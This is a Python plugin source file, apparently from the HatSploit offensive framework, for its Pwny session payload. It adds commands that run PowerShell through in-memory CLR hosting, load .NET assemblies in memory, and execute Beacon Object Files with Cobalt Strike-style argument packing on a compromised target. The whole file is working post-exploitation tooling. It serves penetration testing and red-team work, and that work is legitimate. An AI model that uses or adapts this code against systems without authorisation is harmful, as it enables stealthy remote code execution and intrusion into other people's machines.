"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import struct

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

# Tags — must match execute.c offsets
PS_EXECUTE = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
EXECUTE_ASSEMBLY_RUN = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
BOF_EXECUTE = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

# Custom TLV types — must match execute.c
TLV_TYPE_PS_COMMAND = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
TLV_TYPE_PS_OUTPUT = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)

# BOF argument buffer type (TLV_TYPE_BYTES + 1, matching the C side)
BOF_TYPE_ARGS = TLV_TYPE_BYTES + 1


class BOFPacker:
    """Pack arguments for BOF entry points using Cobalt Strike's
    bof_pack convention: length-prefixed typed values."""

    def __init__(self):
        self.buffer = b''

    def add_int(self, value):
        self.buffer += struct.pack('<I', value & 0xFFFFFFFF)

    def add_short(self, value):
        self.buffer += struct.pack('<H', value & 0xFFFF)

    def add_str(self, value):
        if isinstance(value, str):
            value = value.encode('utf-8') + b'\x00'
        self.buffer += struct.pack('<I', len(value)) + value

    def add_wstr(self, value):
        if isinstance(value, str):
            value = value.encode('utf-16-le') + b'\x00\x00'
        self.buffer += struct.pack('<I', len(value)) + value

    def add_bytes(self, value):
        self.buffer += struct.pack('<I', len(value)) + value

    def get(self):
        return self.buffer


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Execute Plugin",
            'Plugin': "execute",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': (
                "In-memory code execution: PowerShell via CLR hosting, "
                ".NET assembly loading, and Beacon Object File (BOF) execution."
            ),
        })

        self.commands = [
            Command({
                'Category': "manage",
                'Name': "powershell",
                'Description': "Execute a PowerShell command in-memory.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('command',),
                        {
                            'help': "PowerShell command or script block.",
                            'nargs': '+',
                        }
                    ),
                    (
                        ('-f', '--file'),
                        {
                            'help': (
                                "Local .ps1 file to execute on target. "
                                "Contents are read and sent as a command."
                            ),
                            'metavar': 'PATH',
                        }
                    ),
                ]
            }),
            Command({
                'Category': "exploit",
                'Name': "execute_assembly",
                'Description': "Execute a .NET assembly in-memory via CLR hosting.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('file',),
                        {
                            'help': "Path to the local .NET assembly (.exe) file.",
                        }
                    ),
                    (
                        ('-a', '--args'),
                        {
                            'help': "Arguments to pass to the assembly entry point.",
                            'metavar': 'ARGS',
                            'default': '',
                        }
                    ),
                ]
            }),
            Command({
                'Category': "manage",
                'Name': "bof",
                'Description': "Execute a Beacon Object File (COFF .o) in-memory.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('file',),
                        {
                            'help': "Path to the COFF object file (.o).",
                            'type': str,
                        }
                    ),
                    (
                        ('-a', '--args'),
                        {
                            'help': "Hex-encoded argument buffer for go().",
                            'metavar': 'HEX',
                        }
                    ),
                    (
                        ('-s', '--str-args'),
                        {
                            'help': "Pass string arguments (packed as bof_pack z-strings).",
                            'nargs': '*',
                            'metavar': 'STR',
                        }
                    ),
                ]
            }),
        ]

    # -----------------------------------------------------------------
    # PowerShell
    # -----------------------------------------------------------------

    def powershell(self, args):
        if args.file:
            try:
                with open(args.file, 'r') as f:
                    command = f.read()
            except FileNotFoundError:
                self.print_error(f"File not found: {args.file}")
                return
            except Exception as e:
                self.print_error(f"Error reading file: {e}")
                return
        else:
            command = ' '.join(args.command)

        if not command.strip():
            self.print_error("No command specified!")
            return

        self.print_process("Executing PowerShell command...")

        result = self.session.send_command(
            tag=PS_EXECUTE,
            plugin=self.plugin,
            args={TLV_TYPE_PS_COMMAND: command},
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("PowerShell execution failed!")
            self.print_error(
                "Ensure .NET Framework 4.x and "
                "System.Management.Automation are available."
            )
            return

        output = result.get_string(TLV_TYPE_PS_OUTPUT)
        if output:
            self.print_empty(output)

    # -----------------------------------------------------------------
    # Execute Assembly
    # -----------------------------------------------------------------

    def execute_assembly(self, args):
        try:
            with open(args.file, 'rb') as f:
                assembly = f.read()
        except Exception as e:
            self.print_error(f"Failed to read assembly: {e}")
            return

        if len(assembly) == 0:
            self.print_error("Assembly file is empty!")
            return

        self.print_process(
            f"Loading .NET assembly ({len(assembly)} bytes)..."
        )

        cmd_args = {
            TLV_TYPE_BYTES: assembly,
        }

        if args.args:
            cmd_args[TLV_TYPE_STRING] = args.args

        result = self.session.send_command(
            tag=EXECUTE_ASSEMBLY_RUN,
            plugin=self.plugin,
            args=cmd_args,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Assembly execution failed! Ensure the file is a valid "
                ".NET assembly and the CLR is available on the target."
            )
            return

        self.print_success("Assembly executed successfully.")

    # -----------------------------------------------------------------
    # BOF Loader
    # -----------------------------------------------------------------

    def bof(self, args):
        try:
            with open(args.file, 'rb') as f:
                obj_data = f.read()
        except (IOError, OSError) as e:
            self.print_error("Cannot read object file: %s" % str(e))
            return

        tlv_args = {
            TLV_TYPE_BYTES: obj_data,
        }

        # Build argument buffer
        arg_buf = b''

        if args.args:
            try:
                arg_buf = bytes.fromhex(args.args)
            except ValueError:
                self.print_error("Invalid hex argument buffer!")
                return

        elif args.str_args:
            packer = BOFPacker()
            for s in args.str_args:
                packer.add_str(s)
            arg_buf = packer.get()

        if arg_buf:
            tlv_args[BOF_TYPE_ARGS] = arg_buf

        self.print_process("Executing BOF (%d bytes)..." % len(obj_data))

        result = self.session.send_command(
            tag=BOF_EXECUTE,
            plugin=self.plugin,
            args=tlv_args,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("BOF execution failed!")
            return

        self.print_success("BOF executed successfully.")

    def load(self):
        pass
